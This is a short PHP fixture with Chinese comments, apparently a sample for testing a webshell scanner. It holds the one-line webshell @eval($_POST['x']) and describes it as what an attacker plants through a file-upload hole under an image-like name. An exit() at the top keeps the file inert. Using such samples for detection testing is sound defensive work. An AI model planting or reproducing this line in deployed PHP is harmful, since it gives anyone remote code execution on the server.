<?php
/**
 * ！！演示样本文件，仅用于 webshell 检测测试，请勿部署到任何服务器！！
 * 首行 exit() 保证该文件即使被访问也不会执行任何代码。
 *
 * 这个样本模拟攻击者通过文件上传漏洞落地的「一句话木马」：
 * 文件名伪装成图片（img_20240115.php），内容是把 POST 参数直接交给 eval 执行。
 */
exit('irscan sample: inert file, contains webshell signatures for detection testing only.');

// ---- 以下是被检测的特征片段（因上方 exit() 而不会被执行）----
@eval($_POST['x']);
?>
